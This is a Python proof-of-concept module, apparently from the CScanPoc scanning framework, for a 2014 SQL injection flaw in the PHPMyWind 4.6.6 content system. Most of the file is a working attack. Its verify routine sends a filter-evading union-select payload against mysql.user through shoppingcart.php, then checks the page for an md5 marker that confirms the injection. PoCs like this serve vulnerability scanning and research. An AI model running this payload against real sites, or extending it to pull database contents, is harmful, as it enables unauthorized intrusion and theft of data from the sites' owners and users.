# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0004'  # 平台漏洞编号，留空
    name = 'PHPMyWind SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-24'  # 漏洞公布时间
    desc = '''
        PHPMyWind 是一款基于PHP+MySQL开发，符合W3C标准的建站引擎。
        PHPMyWind SQL注入漏洞：
        /phpmywind/shoppingcart.php?a=addshopingcart&goodsid=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=049845'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = '4.6.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a9c16baa-e311-4b7b-b38a-a0881b2bf2be'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.2 refer=http://www.wooyun.org/bugs/wooyun-2010-049845
            payload1 = "/phpmywind/shoppingcart.php?a=addshopingcart&goodsid=1%20and%20@`'`%20/*!50000union*/%20select%20null,null,null,null,null,null,null,null,null,null,md5(1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20mysql.user%20where%201=1%20or%20@`'`&buynum=1&goodsattr=tpcs"
            target1 = self.target + payload1
            code, head, body, errcode, final_url = hh.http(target1)
            payload2 = "/phpmywind/shoppingcart.php"
            target2 = self.target + payload2
            code, head, body, errcode, final_url = hh.http(target2)

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole('Step1: '+target1+'\nStep2: '+target2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
